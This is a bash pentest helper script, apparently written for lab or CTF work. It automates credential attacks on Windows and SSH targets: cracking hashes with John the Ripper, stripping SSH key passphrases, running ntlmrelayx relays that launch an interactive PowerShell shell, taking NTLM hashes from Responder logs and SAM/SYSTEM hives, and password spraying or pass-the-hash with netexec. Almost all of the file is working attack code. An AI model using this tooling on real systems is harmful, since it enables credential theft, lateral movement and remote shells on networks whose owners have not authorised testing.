#!/bin/bash
SCRIPTDIR=$(dirname "${BASH_SOURCE[0]}")
source "$SCRIPTDIR/.env"
source "$SCRIPTDIR/general.sh"
source "$SCRIPTDIR/mimikatz.sh"

use_host_for_cracking() {
    if [[ ! -z "$host_username" ]] && [[ ! -z "$host_computername" ]]; then
        return 0
    else
        echo "Host username and computer name must be set before using host for cracking."
        return 1
    fi
}

john_generic() {
    if [[ -z "$hash_file" ]]; then
        echo "Hash file must be set before running John the Ripper."
        return 1
    fi
    if [[ ! -f "$hash_file" ]]; then
        echo "$hash_file not found, cannot run John the Ripper."
        return 1
    fi
    if [[ -z "$john_wordlist" ]]; then
        john_wordlist="/usr/share/wordlists/rockyou.txt"
    fi
    local john_rule_option=""
    if [[ ! -z "$john_rule" ]]; then
      if [[ ! -f "$john_rule" ]]; then
            echo "John rule file not found, using default rules."
            john_rule="/usr/share/john/rules/best64.rule"
        fi
        echo "[List.Rules:generalRules]" > "john-local.conf"
        cat "$john_rule" >> "john-local.conf"
        john_rule_option="--rules=generalRules"
    fi
    john --wordlist="$john_wordlist" $john_rule_option "$hash_file"
}

john_ssh_password() {
     if [[ -z "$identity" ]]; then
        echo "Identity file must be set before running hashcat for SSH password."
        return 1
    fi
    if [[ -z "$hash_file" ]]; then
        hash_file="hashes.$identity"
    else
        echo "Using provided hash file: $hash_file"
    fi
    if [[ ! -f "$hash_file" ]]; then
        echo "Running ssh2john to generate hash file."
        ssh2john "$identity" > "$hash_file"
    else
        echo "$hash_file already exists, skipping ssh2john."
    fi
    john_generic
}

john_show() {
    if [[ -z "$hash_file" ]]; then
        echo "Hash file must be set before running John the Ripper --show."
        return 1
    fi
    john --show "$hash_file"
}

start_ntlmrelay() {
    if [[ -z "$target_ip" ]]; then
        echo "Target IP must be set before running ntlmrelay."
        return 1
    fi
    echo "Starting ntlmrelay on target IP: $target_ip"
    if [[ -z "$cmd" ]]; then
        cmd=$(get_powershell_interactive_shell)
    fi
    if pgrep -f "ntlmrelayx"; then
        echo "ntlmrelay is already running, skipping."
        return 0
    fi
    sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py --no-http-server -smb2support -c "$cmd" | tee -a $trail_log

}

stop_ntlmrelay() {
    if pgrep -f "ntlmrelayx"; then
        echo "Stopping ntlmrelay..."
        sudo pkill -f "ntlmrelayx"
    else
        echo "No ntlmrelay process found."
    fi
}



get_hash_from_responder_txt() {
    if [[ -z "$target_ip" ]]; then
        echo "Target IP must be set before running Responder."
        return 1
    fi
    if [[ -z "$target_username" ]]; then
        echo "Target username must be set before running Responder."
        return 1
    fi
    if [[ -z "$responder_txt" ]]; then
        if [[ -z "$target_ip" ]]; then
            echo "Target IP must be set before running Responder."
            return 1
        fi
        if [[ -z "$target_protocol" ]]; then
            target_protocol="SMB"
        fi
        if [[ -z "$target_hash_mode" ]]; then
            target_hash_mode="NTLMv2-SSP"
        fi        
        responder_txt="${target_protocol}-${target_hash_mode}-${target_ip}.txt"
        responder_txt="/usr/share/responder/logs/$responder_txt"
    fi
    if [[ ! -f "$responder_txt" ]] || [[ ! -s "$responder_txt" ]]; then
        echo "Responder text file $responder_txt not found or empty."
        return 1
    fi
    ntlm_hash=$(cat "$responder_txt" | grep -i "$target_username" | tail -n 1)    
    if [[ -z "$ntlm_hash" ]]; then
        echo "NTLM hash for user $target_username not found in Responder text file."
        return 1
    fi
    if [[ -z "$hash_file" ]]; then
        hash_file="hashes.$target_username"        
    fi
    echo "Going to save NTLM hash to $hash_file"
    echo "$ntlm_hash" > "$hash_file"
}

append_lm_hash() {
    if [[ ! -z $1 ]]; then
        local lm_hash="00000000000000000000000000000000"
        echo "$lm_hash:$1"
    fi
}

remove_openssh_passphrase() {
    if [[ -z "$identity" ]]; then
        echo "Identity file must be set before removing passphrase."
        return 1
    fi
    if [[ -z $passphrase ]]; then
        echo "Passphrase must be set before removing passphrase."
        return 1
    fi
    ssh-keygen -p -f "$identity" -P $passphrase -N ""
}

run_netexec() {
    if [[ -z "$netexec_protocol" ]]; then
        netexec_protocol=smb
    fi
    if [[ -z "$target_ip" ]]; then
        echo "Target IPs must be set before running netexec."
        return 1
    fi
    local netexec_user_options=""
    if [[ -z "$username" ]]; then
        username="usernames.txt"
    fi
    if [[ ! -z "$username" ]]; then
        netexec_user_options="-u $username"
        echo "Using $netexec_user_options"
    fi
    local netexec_password_options=""
    if [[ -z "$password" ]]; then
        password="passwords.txt"
        if [[ ! -f "$password" ]]; then
            echo "Password file $password not found. Assuming you wanted blank password"
            password="''"
        fi
    fi
    if [[ ! -z "$password" ]]; then
        netexec_password_options="-p $password"
        echo "Using $netexec_password_options"
    fi
    if [[ ! -z "$ntlm_hash" ]]; then
        netexec_password_options="-H $ntlm_hash"
        echo "Using NTLM hash for authentication."
    fi
    local proxychain_command=""
    if [[ ! -z "$use_proxychain" ]] && [[ "$use_proxychain" == "true" ]]; then
        proxychain_command="proxychains -q "
        echo "Running netexec with proxychains"
    fi    
    echo ${proxychain_command}netexec $netexec_protocol $target_ip $netexec_user_options $netexec_password_options $netexec_additional_options
    ${proxychain_command}netexec $netexec_protocol $target_ip $netexec_user_options $netexec_password_options $netexec_additional_options
}

trim_rockyou() {
    local minimal_characters=$1
    if [[ -z "$minimal_characters" ]]; then
        echo "Minimal characters must be set."
        return 1
    fi
    awk "length(\$0) >= $minimal_characters" /usr/share/wordlists/rockyou.txt > rockyou_${minimal_characters}plus.txt
}

perform_kdbx_recovery() {
    if [[ ! -f $kdbx_file ]]; then
        echo "Could not find file $kdbx_file specified"
        return 1
    fi
    hash_file=hashes.${kdbx_file%.kdbx}
    kdbx_password=$(hashcat_show | grep keepass | awk -F':' '{print $2}')
    echo $kdbx_password
    if [[ -z $kdbx_password ]]; then
        hashcat_kdbx
    fi
}

run_keepassxc_cli_command () {
    echo $kdbx_password | keepassxc-cli $1 $kdbx_file "$2"
}

get_hashes_from_secrets_dump() {
    if [[ ! -z "$1" ]]; then
        target_username="$1"
    fi
    if [[ -z $target_username ]]; then
        echo "No target username provided"
        return 1
    fi
    if [[ -z $target_sam ]]; then
        target_sam=sam.hive
        if [[ ! -f "$target_sam" ]]; then
            echo "No target SAM provided and default $target_sam not found, cannot get hashes from secretsdump."
            return 1
        fi
        echo "No target SAM provided, using default $target_sam"        
    fi
    if [[ -z $target_system ]]; then
        target_system=system.hive
        if [[ ! -f "$target_system" ]]; then
            echo "No target SYSTEM provided and default $target_system not found, cannot get hashes from secretsdump."
            return 1
        fi
        echo "No target SYSTEM provided, using default $target_system"
    fi
    #replace the hashfile
    if [[ -z "$target_domain" ]]; then
        hash_file=hashes.$target_username
    else
        hash_file=hashes.$target_domain.$target_username
    fi
    ntlm_hash=$(secretsdump.py -sam $target_sam -system $target_system LOCAL | grep $target_username | awk -F':' '{print $4}')
    if [[ -z $ntlm_hash ]]; then
        echo "No NTLM hash found for $target_username"
        return 1
    fi
    echo $ntlm_hash > $hash_file

}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    if [[ -z "$1" ]]; then
        echo "Usage: $0 <command>"
        echo "Available commands: crack_ssh_identity, hashcat_ntlm, start_ntlmrelay, stop_ntlmrelay, hashcat_kerberoast, hashcat_asrep_kerberoast, hashcat_show <hash_mode> <hash_file>, hashcat_keepass, hashcat_ssh_password <identity_file>, john_ssh_password <identity_file>, john_rule <john_rule_file>, john_show <hash_file>, run_mimikatz_lsadump_sam <mimikatz_log> <target_username>, hashcat_kdbx <kdbx_file> <hashcat_rule>"
        exit 1
    fi

    command=$1
    case $command in
        crack_ssh_identity)
            crack_ssh_identity
            ;;
        hashcat_ntlm)
            hashcat_ntlm
            ;;
        start_ntlmrelay)
            start_ntlmrelay
            ;;
        stop_ntlmrelay)
            stop_ntlmrelay
            ;;
        hashcat_kerberoast)
            hashcat_kerberoast
            ;;
        hashcat_asrep_kerberoast)
            hashcat_asrep_kerberoast
            ;;
        hashcat_show)
            hash_mode=$2
            hash_file=$3
            hashcat_show
            ;;
        hashcat_keepass)
            hashcat_keepass
            ;;
        hashcat_ssh_password)
            identity_file=$2
            hashcat_ssh_password
            ;;
        hashcat_kdbx)
            kdbx_file=$2
            hashcat_rule=$3
            hashcat_kdbx "$kdbx_file"
            ;;
        john_ssh_password)
            identity_file=$2
            john_rule=$3
            john_ssh_password
            ;;
        john_show)
            hash_file=$2
            john_show
            ;;
        hashcat_net_ntlm)
            hash_file=$2
            hashcat_net_ntlm
            ;;
        run_mimikatz_lsadump_sam)
            mimikatz_log=$2
            target_username=$3
            run_mimikatz_lsadump_sam
            ;;
        append_lm_hash)
            if [[ -z "$2" ]]; then
                echo "Usage: $0 append_lm_hash <ntlm_hash>"
                exit 1
            fi
            append_lm_hash "$2"
            ;;
        get_hash_from_responder_txt)
            target_ip=$2
            target_username=$3
            responder_txt=$4
            get_hash_from_responder_txt
            ;;
        *)
            echo "Unknown command: $command"
            exit 1
            ;;
    esac
fi